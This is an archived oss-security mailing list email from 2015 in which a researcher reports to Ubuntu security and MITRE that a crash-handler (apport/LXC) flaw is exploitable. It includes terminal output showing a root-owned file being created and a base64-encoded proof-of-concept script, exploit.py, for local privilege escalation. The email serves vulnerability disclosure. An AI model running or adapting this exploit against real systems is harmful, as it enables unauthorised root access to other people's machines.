X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2181" "Wednesday" "15" "April" "2015" "12:55:53" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>" "51" "Re: [oss-security] Re: Problems in automatic crash analysis frameworks" nil nil nil "4" "2015041519:55:53" "[oss-security] Re: Problems in automatic crash analysis frameworks" (number mark "        taviso@googl Apr 15   51/2181  " thread-indent "\"Re: [oss-security] Re: Problems in automatic crash analysis frameworks\"\n") "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>" ("<20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>" "<552D3A20.8040909@canonical.com>" "<CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>" "<CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>" "<CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>" "<20150414221607.GA5795@boyd>" "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 18351 invoked by uid 550); 15 Apr 2015 19:57:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 18333 invoked from network); 15 Apr 2015 19:57:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc:content-type;
        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
        b=JFm6V9Uy3sf2mRhwEwXAUFJ52xhFJziKfE2rAbfZYfR3Vjhc2S1EpHNK+mGBCMc/9L
         osHtUitJmzdJ+qeP45vGIbu58MPK7zCjRzPy+vWKeNuW+s+kXrWJpKlSy5yUVfiMwa1R
         pktAGrOqKtdsaibRZJqjxn62BOLLXr4gKXDwd6uKLdkGmS5geUKZpD4+mW1VjMLXxBGD
         onBOMBLNUIoBHwxzQwcgY5QX0P2koctTpjXpVRJoIWB5rm7GAREuaUwOtjWQvbzNv1tE
         lUrl5oGLqr+Og4WMZMRb7nhBenmT5goXn8RTyUZvFnQmPLnSslE/THtlGEjnFhrStbHy
         r2ag==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc:content-type;
        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
        b=kmcRKx7/WByIcMXkxBSnxydKQ8oRrgfGe5gf0EFq8xmk7Fk2Sed4VOj6aUMZ6dKrod
         iHAXDGjzCL0zTX+Bbvpfm6smY4ZOBQ5oQZ3E3ecWzOjFPZ2aSMlGbwOJdwjkg3O0SyXE
         6B6qehstUNN7Z4l6DSEnbw+lMlR3YdE638Mbrd5KrnbTIbIhTSnKi9K0YGovanyO5/57
         R2TFBN6RmdA+Hr/ik8CaINUgWhT7BkeitPH/ren7ioz5RkwPvI91rnVbRQ/kzvSi0/mP
         ls+5idPwMCO4NzIueO6cgKOtcd4hVaedK2t8VNmeF5+soTGF2akPVWtoeoba4Q/ur+fs
         cLAw==
X-Gm-Message-State: ALoCoQnKDNEC7OoK6OxthQSC+UGHOG/rQTFojvWH8ZecQP5KoyOQSecUVLo0pDQ/Z88SPsVL+luF
X-Received: by 10.229.122.138 with SMTP id l10mr35123430qcr.26.1429127774607;
 Wed, 15 Apr 2015 12:56:14 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
References: <20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>
 <552D3A20.8040909@canonical.com> <CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>
 <CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>
 <CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>
 <20150414221607.GA5795@boyd> <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
Message-ID: <CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>
Content-Type: multipart/mixed; boundary=001a1134a8b45856c00513c8bd75
Cc: oss-security@lists.openwall.com, 
	Assign a CVE Identifier <cve-assign@mitre.org>, security <security@ubuntu.com>, 
	=?UTF-8?Q?St=C3=A9phane_Graber?= <stgraber@ubuntu.com>
Date: Wed, 15 Apr 2015 12:55:53 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: Problems in automatic crash analysis frameworks
To: Tyler Hicks <tyhicks@canonical.com>

--001a1134a8b45856c00513c8bd75
Content-Type: text/plain; charset=UTF-8

On Wed, Apr 15, 2015 at 11:48 AM, Tavis Ormandy <taviso@google.com> wrote:
> FWIW, I verified this is exploitable.
>

Here's the script I used to verify, it should create the file
/etc/rootfiletest. By using the partial trick or creating parse
errors, this is easy to turn into a root shell.

Note: I'm a c programmer, I don't know python at all, it's probably
the worlds worst python code - I used python because I was reading the
python3-lxc code.

taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
ls: cannot access /etc/rootfiletest: No such file or directory
taviso@ubuntu:~/tmp$ rm -rf /tmp/?0* /tmp/exploit/
taviso@ubuntu:~/tmp$ python3 test.py
taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
-rw-rw---- 1 root root 0 Apr 15 12:53 /etc/rootfiletest

Tavis.

--001a1134a8b45856c00513c8bd75
Content-Type: text/x-python; charset=US-ASCII; name="exploit.py"
Content-Disposition: attachment; filename="exploit.py"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_i8j5o1rr0

IyEvdXNyL2Jpbi9weXRob24zCiMgVGVzdCBzY3JpcHQgZm9yIGFwcG9ydCB2
dWxuZXJhYmlsaXR5LgojICB0YXZpc29AY21weGNoZzhiLmNvbQoKaW1wb3J0
IHNvY2tldCwgb3MsIHNpZ25hbAppbXBvcnQgY3R5cGVzCgpvcy5ta2Rpcign
L3RtcC9cbjAgMSAyIDMgNCA1IDYgJykKb3MubWtkaXIoJy90bXAvXG4wIDEg
MiAzIDQgNSA2IC90bXAnKQpvcy5ta2RpcignL3RtcC9cbjAgMSAyIDMgNCA1
IDYgL3RtcC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvXG4wIDEgMiAzIDQg
NSA2IC90bXAvZXhwbG9pdC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvZXhw
bG9pdC8nKQpvcy5ta2RpcignL3RtcC9leHBsb2l0L2V4cGxvaXQvJykKCmYg
PSBvcGVuKCcvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb25maWcnLCAndycpCmYu
d3JpdGUoImx4Yy5sb2dmaWxlID0gL2V0Yy9yb290ZmlsZXRlc3RcbiIpCmYu
Y2xvc2UoKQoKc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX1VOSVgs
IHNvY2tldC5TT0NLX1NUUkVBTSkKc29jay5iaW5kKCcvdG1wL1xuMCAxIDIg
MyA0IDUgNiAvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb21tYW5kJykKc29jay5s
aXN0ZW4oMSkKCmxpYmMgPSBjdHlwZXMuQ0RMTCgibGliYy5zby42IikKCmxp
YmMudW5zaGFyZSgweDIwMDAwMDAwfDB4MTAwMDAwMDApCgppZiBsaWJjLmZv
cmsoKSA9PSAwOgoJaWYgbGliYy5mb3JrKCkgPT0gMDoKCQlvcy5raWxsKGxp
YmMuZ2V0cGlkKCksIHNpZ25hbC5TSUdTRUdWKQoJZWxzZToKCQlsaWJjLndh
aXRwaWQoLTEsIDAsIDApCmVsc2U6CglsaWJjLndhaXRwaWQoLTEsIDAsIDAp
Cg==

--001a1134a8b45856c00513c8bd75--
